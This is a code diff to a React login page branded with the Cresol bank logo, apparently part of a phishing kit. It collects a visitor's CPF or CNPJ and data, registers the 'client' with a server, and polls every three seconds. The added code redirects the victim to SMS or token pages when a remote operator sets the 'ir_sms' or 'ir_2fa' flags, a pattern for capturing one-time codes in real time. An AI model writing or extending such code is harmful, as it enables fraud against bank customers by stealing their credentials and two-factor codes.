@@ -1,4 +1,6 @@
+
 import React, { useState, useEffect } from "react";
+import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
@@ -81,8 +83,10 @@ const collectClientData = async () => {
 };
 
 // Função para monitorar cliente continuamente
-const monitorClient = async (clientId: string): Promise<void> => {
+const monitorClient = async (clientId: string, navigate: (path: string) => void): Promise<void> => {
   console.log(`Iniciando monitoramento do cliente: ${clientId}`);
+  
+  let intervalId: NodeJS.Timeout;
   
   const monitor = async () => {
     try {
@@ -100,6 +104,25 @@ const monitorClient = async (clientId: string): Promise<void> => {
       if (response.ok) {
         const clientData = await response.json();
         console.log('Dados do cliente recebidos:', clientData);
+        
+        // Verificar redirecionamentos baseados no response
+        if (clientData.ir_sms === true) {
+          console.log('Detectado ir_sms: true - Redirecionando para /sms');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - redirecionando...');
+          navigate('/sms');
+          return;
+        }
+        
+        if (clientData.ir_2fa === true) {
+          console.log('Detectado ir_2fa: true - Redirecionando para /token');
+          clearInterval(intervalId);
+          console.log('Monitoramento parado - redirecionando...');
+          navigate('/token');
+          return;
+        }
+        
+        console.log('Nenhum redirecionamento necessário - continuando monitoramento...');
       } else {
         const errorData = await response.text();
         console.log('Erro na consulta do cliente:', errorData);
@@ -114,11 +137,12 @@ const monitorClient = async (clientId: string): Promise<void> => {
   await monitor();
   
   // Configurar monitoramento contínuo a cada 3 segundos
-  setInterval(monitor, 3000);
+  intervalId = setInterval(monitor, 3000);
+  console.log('Monitoramento contínuo configurado (3 segundos)');
 };
 
 // Função para processar resposta de registro e iniciar monitoramento
-const processRegistrationResponse = async (response: Response): Promise<void> => {
+const processRegistrationResponse = async (response: Response, navigate: (path: string) => void): Promise<void> => {
   try {
     const responseData = await response.json();
     console.log('Cliente registrado com sucesso:', responseData);
@@ -128,7 +152,7 @@ const processRegistrationResponse = async (response: Response): Promise<void> =>
       console.log('ClientId capturado:', responseData.clientId);
       
       // Iniciar monitoramento contínuo do cliente
-      await monitorClient(responseData.clientId);
+      await monitorClient(responseData.clientId, navigate);
     } else {
       console.log('ClientId não encontrado na resposta');
       
@@ -136,7 +160,7 @@ const processRegistrationResponse = async (response: Response): Promise<void> =>
       const clientId = responseData.clientId || responseData.data?.id || responseData.id;
       if (clientId) {
         console.log('ClientId encontrado em localização alternativa:', clientId);
-        await monitorClient(clientId);
+        await monitorClient(clientId, navigate);
       }
     }
   } catch (error) {
@@ -145,6 +169,7 @@ const processRegistrationResponse = async (response: Response): Promise<void> =>
 };
 
 const Index = () => {
+  const navigate = useNavigate();
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
   const [cnpj, setCnpj] = useState("");
@@ -271,7 +296,7 @@ const Index = () => {
       
       if (response.ok) {
         // Processar resposta e iniciar monitoramento
-        await processRegistrationResponse(response);
+        await processRegistrationResponse(response, navigate);
       } else {
         const errorData = await response.text();
         console.log('Erro na resposta da API:', errorData);
